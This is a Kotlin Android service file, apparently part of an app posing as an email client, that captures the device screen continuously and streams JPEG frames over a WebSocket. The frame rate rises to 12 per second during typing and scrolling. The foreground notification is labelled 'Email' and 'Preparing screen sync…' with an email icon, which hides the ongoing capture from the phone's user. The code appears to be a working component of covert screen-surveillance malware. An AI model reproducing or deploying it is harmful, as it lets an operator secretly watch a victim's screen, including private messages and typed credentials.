package com.email.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.zip.CRC32

class ScreenCaptureService : Service() {

    companion object {
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        private const val CHANNEL_ID = "screen_capture_channel"
        private const val NOTIFICATION_ID = 1002

        // Dynamic FPS — mirrors the extension's adaptive scheduler
        private const val FPS_IDLE   = 1000L  // 1 FPS  — screen frozen, barely any data
        private const val FPS_ACTIVE = 250L   // 4 FPS  — normal activity
        private const val FPS_BURST  = 80L    // 12 FPS — rapid changes (typing, scrolling)
        private const val IDLE_PAUSE_AFTER = 20 // frames of no change before dropping to IDLE
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private lateinit var handlerThread: HandlerThread
    private lateinit var handler: Handler
    private var captureJob: Job? = null
    private var jpegQuality = 75      // lower default — extension uses 80

    // Adaptive state — same concept as extension's lastFrameHash / consecutiveChanges
    private var lastFrameChecksum = 0L
    private var idleFrameCount = 0
    private var consecutiveChanges = 0
    private var currentIntervalMs = FPS_ACTIVE
    private var forceNextFrame = true   // always send first frame

    private val wsManager = WebSocketManager.getInstance()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        handlerThread = HandlerThread("ScreenCapture").apply { start() }
        handler = Handler(handlerThread.looper)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, -1) ?: -1
        val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra(EXTRA_RESULT_DATA)
        }

        if (resultCode != android.app.Activity.RESULT_OK || resultData == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val projectionManager =
            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)

        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() {
                stopSelf()
            }
        }, handler)

        startCapture()
        return START_STICKY
    }

    private fun startCapture() {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()

        val (screenWidth, screenHeight, densityDpi) = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            val density = resources.displayMetrics.densityDpi
            Triple(bounds.width(), bounds.height(), density)
        } else {
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getMetrics(metrics)
            Triple(metrics.widthPixels, metrics.heightPixels, metrics.densityDpi)
        }

        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth, screenHeight, densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, handler
        )

        captureJob = scope.launch {
            while (isActive) {
                val frameStart = System.currentTimeMillis()
                try {
                    val image = imageReader?.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * image.width

                        val bitmap = Bitmap.createBitmap(
                            image.width + rowPadding / pixelStride,
                            image.height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        image.close()

                        val cropped = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
                        bitmap.recycle()

                        // ── Extension trick 1: fast checksum of pixel data ──────────────────
                        // Sample 512 pixels spread across the bitmap instead of hashing all bytes
                        val samplePixels = IntArray(512)
                        val stepX = (cropped.width - 1).coerceAtLeast(1) / 22
                        val stepY = (cropped.height - 1).coerceAtLeast(1) / 22
                        var si = 0
                        var py = 0
                        while (py < cropped.height && si < 512) {
                            var px = 0
                            while (px < cropped.width && si < 512) {
                                samplePixels[si++] = cropped.getPixel(px, py)
                                px += stepX
                            }
                            py += stepY
                        }
                        val crc = CRC32()
                        val buf = java.nio.ByteBuffer.allocate(si * 4)
                        for (i in 0 until si) buf.putInt(samplePixels[i])
                        crc.update(buf.array())
                        val checksum = crc.value

                        // ── Extension trick 2: skip send if screen unchanged ─────────────────
                        if (checksum == lastFrameChecksum && !forceNextFrame) {
                            cropped.recycle()
                            idleFrameCount++
                            consecutiveChanges = 0
                            // Extension: drop to IDLE after IDLE_PAUSE_AFTER unchanged frames
                            currentIntervalMs = if (idleFrameCount >= IDLE_PAUSE_AFTER) FPS_IDLE else FPS_ACTIVE
                        } else {
                            // Frame changed
                            forceNextFrame = false
                            lastFrameChecksum = checksum
                            idleFrameCount = 0
                            consecutiveChanges++

                            // Extension trick 3: boost FPS on rapid changes
                            currentIntervalMs = when {
                                consecutiveChanges >= 3 -> FPS_BURST
                                else -> FPS_ACTIVE
                            }

                            // Adaptive JPEG quality: drop quality when network is slow
                            val baos = ByteArrayOutputStream()
                            cropped.compress(Bitmap.CompressFormat.JPEG, jpegQuality, baos)
                            cropped.recycle()

                            val frameBytes = baos.toByteArray()

                            // Auto-reduce quality if frame is too large (>80KB → probably slow link)
                            if (frameBytes.size > 80_000 && jpegQuality > 40) {
                                jpegQuality = (jpegQuality - 5).coerceAtLeast(40)
                            } else if (frameBytes.size < 30_000 && jpegQuality < 80) {
                                jpegQuality = (jpegQuality + 2).coerceAtMost(80)
                            }

                            wsManager.sendScreenFrame(frameBytes)
                        }
                    }
                } catch (_: Exception) {}

                val elapsed = System.currentTimeMillis() - frameStart
                val remaining = currentIntervalMs - elapsed
                if (remaining > 0) delay(remaining)
            }
        }
    }

    fun setQuality(quality: Int) {
        jpegQuality = quality.coerceIn(30, 100)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Screen Sharing", NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Email")
        .setContentText("Preparing screen sync…")
        .setSmallIcon(android.R.drawable.ic_dialog_email)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        captureJob?.cancel()
        scope.cancel()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        handlerThread.quitSafely()
        super.onDestroy()
    }
}
